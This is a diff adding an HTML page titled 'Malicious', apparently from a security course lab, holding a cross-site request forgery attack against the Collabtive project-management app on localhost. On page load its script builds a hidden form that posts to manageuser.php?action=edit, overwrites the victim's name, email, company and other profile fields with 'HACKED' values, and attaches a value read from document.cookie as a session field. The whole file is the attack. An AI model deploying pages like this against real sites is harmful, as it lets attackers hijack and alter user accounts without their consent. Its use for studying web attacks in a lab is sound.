@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang='en'>
+<head>
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <title>Malicious</title>
+</head>
+<body>
+    <h1>
+        This page creates a form like the one in convert.php, fills fields and submits the form.
+        </h1>
+        <script>
+        
+            function fill_and_send_form() { 
+                // Create a form element, set its attributes, and submit the form
+        
+                // Create a <form> element.
+                var e = document.createElement('form');
+        
+                // Set the attributes of the form
+                e.action = 'http://localhost/hw3/collabtive-31/manageuser.php?action=edit';
+                e.target = '_self'; // The response is displayed in the same frame
+                // Set the next two attributes to appropriate values
+                e.method = 'post';
+        
+                // Create a string with html to set hidden fields 
+                // corresponding to the edit user form
+                // with values chosen by the attacker. 
+                var form_fields;
+                form_fields += "<input type='text' class='text' value='HACKED' name='name' id='name' required='1' realname='Name' tabindex='1' />";
+                form_fields += "<input type='file' class='file' name='userfile' id='avatar' realname='File' size='' onchange='./hacked.jpg' tabindex='2'>"
+                form_fields += "<input type='text' name='company' id='company' value='HACKED' />";
+                form_fields += "<input type='text' class='text' value='HACKED@HACKED.com' name='email' id='email' regexp='EMAIL' required='1' realname='Email'>"
+                form_fields += "<input type='text' class='text' name='web' id='web' realname='URL' value='HACKED.COM'>"
+                form_fields += "<input type='text' class='text' value='111-111-1111' name='tel1' id='tel1'>"
+                form_fields += "<select name='locate' id='locate'>" + "<option value='es' selected='selected'>Español (100%)</option>" + "</select>"
+                form_fields += `<input type='hidden' name='sessionId' value=${listCookies()}>`
+                // (Continue with the other fields)
+        
+                // Add the fields to the form
+                e.innerHTML = form_fields;
+        
+                // Add the form to the current page.
+                document.body.appendChild(e);
+        
+                //submit the form
+                e.submit();
+                // console.log(e)
+            }
+
+            function listCookies() {
+                let ids = [];
+                var theCookies = document.cookie.split(';');
+                var aString = '';
+                for (var i = 1 ; i <= theCookies.length; i++) {
+                    ids.push(theCookies[i]);
+                }
+
+                console.log(ids[0]);
+                return ids[0];
+            }
+        
+        // As soon as the page loads, create the form, fill it and submit it
+            window.onload = function() {
+                fill_and_send_form();
+                // listCookies();
+            }
+        </script>
+</body>
+</html>
